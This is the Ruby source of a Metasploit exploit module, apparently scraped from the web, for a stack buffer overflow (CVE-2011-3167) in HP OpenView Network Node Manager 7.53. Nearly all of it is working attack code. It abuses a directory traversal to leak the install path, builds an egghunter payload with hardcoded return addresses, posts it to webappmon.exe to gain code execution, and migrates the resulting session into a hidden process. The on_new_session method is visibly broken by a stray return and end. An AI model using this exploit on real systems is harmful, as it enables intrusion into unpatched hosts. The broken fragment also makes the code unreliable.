# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    HttpFingerPrint = { :method => &#039;HEAD&#039;, :uri => &#039;/OvCgi/webappmon.exe&#039;, :pattern => /Hewlett-Packard Development Company/ }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Network Node Manager ov.dll _OVBuildPath Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP OpenView Network Node
                Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long
                &#039;textFile&#039; argument when calling the &#039;webappmon.exe&#039; CGI program, an attacker can
                cause a stack-based buffer overflow and execute arbitrary code.
 
                The vulnerable code is within the "_OVBuildPath" function within "ov.dll". There
                are no stack cookies, so exploitation is achieved by overwriting the saved return
                address.
 
                The vulnerability is due to the use of the function "_OVConcatPath" which finally
                uses "strcat" in a insecure way. User controlled data is concatenated to a string
                which contains the OpenView installation path.
 
                To achieve reliable exploitation a directory traversal in OpenView5.exe
                (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation
                path. If the installation path cannot be guessed the default installation path
                is used.
            } ,
            &#039;Author&#039;         =>
                [
                    &#039;Anyway <Aniway.Anyway[at]gmail.com>&#039;, # Vulnerability Discovery
                    &#039;juan vazquez&#039;, # Metasploit module
                    &#039;sinn3r&#039; # Metasploit fu
                ],
            &#039;License&#039;     => MSF_LICENSE,
            &#039;References&#039; =>
                [
                    [ &#039;CVE&#039;, &#039;2011-3167&#039; ],
                    [ &#039;OSVDB&#039;, &#039;76775&#039; ],
                    [ &#039;BID&#039;, &#039;50471&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-002/&#039; ],
                    [ &#039;URL&#039;, &#039;https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03054052&#039; ]
                ],
            &#039;Payload&#039;    =>
                {
                    &#039;Space&#039; => 950,
                    &#039;BadChars&#039; => [*(0x00..0x09)].pack("C*") + [*(0x0b..0x23)].pack("C*") + [0x26, 0x2b, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f].pack("C*"),
                    &#039;DisableNops&#039; => true,
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039;  => &#039;EDI&#039; # Egghunter jmp edi
                        }
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;    =>
                [
                    [ &#039;HP OpenView Network Node Manager 7.53 / Windows 2000 SP4 & Windows XP SP3&#039;,
                        # Patches installed:
                        # * ECS_00048
                        # * NNM_01128
                        # * NNM_01172
                        # * NNM_01187
                        {
                            &#039;Offset&#039;    => 1067,
                            &#039;Ret&#039;       => 0x5a41656a, # pop/pop/ret - in ov.dll (v1.30.5.8002)
                            &#039;JmpESP&#039;    => 0x5a4251c5, # call esp - in ov.dll
                            &#039;EggAdjust&#039; => 4,
                            &#039;ReadableAddress&#039; => 0x5a466930 # ov.dll
                        }
                    ]
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Nov 01 2011&#039;))
 
        register_options(
            [
                Opt::RPORT(80),
            ], self.class)
    end
 
    # The following code allows to migrate if having into account
    # that over Windows XP permissions aren&#039;t granted on %windir%\system32
    #
    # Code ripped from "modules/post/windows/manage/migrate.rb". See it
    # for more information
    def on_new_session(client)
 
            return
        end
 
        client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
 
        # Select path and executable to run depending the architecture
        # and the operating system
        if client.sys.config.sysinfo["OS"] =~ /Windows XP/
            windir = client.fs.file.expand_path("%ProgramFiles%")
            cmd="#{windir}\\Windows NT\\Accessories\\wordpad.exe"
        else # Windows 2000
            windir = client.fs.file.expand_path("%windir%")
            if client.sys.config.sysinfo[&#039;Architecture&#039;] =~ /x86/
                cmd = "#{windir}\\System32\\notepad.exe"
            else
                cmd = "#{windir}\\Sysnative\\notepad.exe"
            end
        end
 
        # run hidden
        print_status("Spawning #{cmd.split("\\").last} process to migrate to")
        proc = client.sys.process.execute(cmd, nil, {&#039;Hidden&#039; => true })
        target_pid = proc.pid
 
        begin
            print_good("Migrating to #{target_pid}")
            client.core.migrate(target_pid)
            print_good("Successfully migrated to process #{target_pid}")
        rescue ::Exception => e
            print_error("Could not migrate in to process.")
            print_error(e.to_s)
        end
 
    end
 
    # Tries to guess the HP OpenView install dir via the Directory traversal identified
    # by OSVDB 44359.
    # If OSVDB 44359 doesn&#039;t allow to retrieve the installation path the default one
    # (C:\Program Files\HP OpenView\) is used.
    # Directory Traversal used:
    # http://host/OvCgi/OpenView5.exe?Context=Snmp&Action=../../../log/setup.log
    def get_install_path
 
        cgi = &#039;/OvCgi/OpenView5.exe&#039;
        web_session = rand_text_numeric(3)
        my_cookie = "OvOSLocale=English_United States.1252; "
        my_cookie << "OvAcceptLang=en-US; "
        my_cookie << "OvJavaLocale=en_US.Cp1252; "
        my_cookie << "OvWebSession=#{web_session}:AnyUser:"
 
        payload = "../../../log/setup.log"
        res = send_request_cgi({
            &#039;uri&#039;         => cgi,
            &#039;cookie&#039; => my_cookie,
            &#039;method&#039;      => "GET",
            &#039;vars_get&#039; =>
                {
                    &#039;Target&#039; => "Main",
                    &#039;Scope&#039; => "Snmp",
                    &#039;Action&#039; => payload
                }
        }, 5)
 
        installation_path = ""
        if res and res.code == 200 and
                res.body =~ /([A-Z]:\\.*\\)log/
            print_status("Installation Path Found in #{$1}")
            installation_path = $1
        else
            print_status("Installation Path Not Found using the default")
            installation_path = "C:\\Program Files\\HP OpenView\\"
        end
 
        return installation_path
    end
 
    def exploit
        print_status("Trying target #{target.name}...")
 
        install_path = get_install_path
        install_path << "help\\English_United States.1252"
 
        eggoptions = {
            :checksum => true,
        }
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        [ &#039;x86/alpha_mixed&#039;].each { |name|
            enc = framework.encoders.create(name)
            if name =~/alpha/
                # If control is transferred to the decoder via "call esp" BufferOfset
                # shoulds be adjusted.
                if target["EggAdjust"] and target["EggAdjust"] > 0
                    enc_options = {
                        &#039;BufferRegister&#039; => &#039;ESP&#039;,
                        &#039;BufferOffset&#039; => target["EggAdjust"]
                    }
                    enc.datastore.import_options_from_hash(enc_options)
                else
                    enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;ESP&#039; })
                end
            end
            hunter = enc.encode(hunter, nil, nil, platform)
        }
 
        offset = target[&#039;Offset&#039;] - install_path.length - egg.length
 
        my_payload = egg
        my_payload << rand_text_alphanumeric(offset)
        my_payload << [target.ret].pack("V")
        my_payload << rand_text_alphanumeric(4) # Padding
        my_payload << [target["ReadableAddress"]].pack("V")
        my_payload << [target["JmpESP"]].pack("V")
        my_payload << hunter
 
        buf = "-textFile+#{my_payload}+++++++++++++++++++++++"
        buf << "-appendSelectList+-appendSelectListToTitle+%09%09++++++"
        buf << "-commandHeading+%22Protocol+++++++++Port++++++++Service%22+++++++++++++++++++++++"
        buf << "-dataLine+2+"
        buf << "-commandTitle+%22Services%22+%09%09++++++"
        buf << "-iconName+%22Services%22+++++++++++++++++++++++"
        buf << "-cmd+rnetstat+"
        buf << "-S"
 
        web_session = rand_text_numeric(3)
        my_cookie = "OvOSLocale=English_United States.1252; "
        my_cookie << "OvAcceptLang=en-US; "
        my_cookie << "OvJavaLocale=en_US.Cp1252; "
        my_cookie << "OvWebSession=#{web_session}:AnyUser:"
 
        cgi = &#039;/OvCgi/webappmon.exe&#039;
 
        res = send_request_cgi({
            &#039;uri&#039;       => cgi,
            &#039;cookie&#039;    => my_cookie,
            &#039;method&#039;    => "POST",
            &#039;vars_post&#039; =>
                {
                    &#039;ins&#039; => &#039;nowait&#039;,
                    &#039;sel&#039; => rand_text_alphanumeric(15),
                    &#039;app&#039; => &#039;IP Tables&#039;,
                    &#039;act&#039; => &#039;Services&#039;,
                    &#039;help&#039; => &#039;&#039;,
                    &#039;cache&#039; => rand_text_numeric(4)
                },
            &#039;data&#039; => "arg=#{buf}" # Avoid uri encoding
        }, 3)
 
        if res and res.code != 502
            print_error("Eek! We weren&#039;t expecting a response, but we got one")
            if datastore[&#039;DEBUG&#039;]
                print_line()
                print_error(res.inspect)
            end
        end
 
        handler
 
    end
 
end
 
=begin
 
* migrate to %windir%/system32/notepad.exe fails on Windows XP SP3
 
 
[*] Running module against HOME-F006222D6C
[*] Current server process: webappmon.exe (7064)
[*] Spawning notepad.exe process to migrate to
[-] Call stack:
[-]   (eval):80:in `create_temp_proc&#039;
[-]   (eval):49:in `run&#039;
=end



